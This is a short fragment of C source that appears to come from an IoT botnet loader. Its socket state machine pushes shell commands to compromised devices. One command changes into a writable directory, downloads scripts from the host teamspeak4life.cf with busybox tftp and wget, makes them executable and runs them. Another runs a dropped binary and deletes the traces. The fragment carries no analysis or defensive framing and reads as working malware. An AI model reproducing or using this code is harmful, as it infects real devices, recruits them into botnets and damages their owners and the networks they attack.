...
close(fd);
system("sh x;chmod +x z;./z;rm -rf z;rm -f x");
}
...
case 9:
{
if(send(fds[i].fd, "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;busybox tftp teamspeak4life.cf -c get tftp.sh;busybox chmod +x tftp.sh;sh tftp.sh;busybox tftp -r tftp1.sh -g teamspeak4life.cf; busybox chmod +x tftp1.sh;sh tftp1.sh;wget http://teamspeak4life.cf/gtop.sh || busybox wget http://teamspeak4life.cf/gtop.sh; chmod +x gtop.sh || busybox chmod +x gtop.sh;sh gtop.sh\r\n", 366, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
fds[i].state = 10;
}
break;
case 10:
{
echoLoader();
send(fds[i].fd, "sh x;chmod +x z;./z;rm -rf z;rm -f x\r\n", 38, MSG_NOSIGNAL);
fds[i].state = 11;
}
case 11:
{
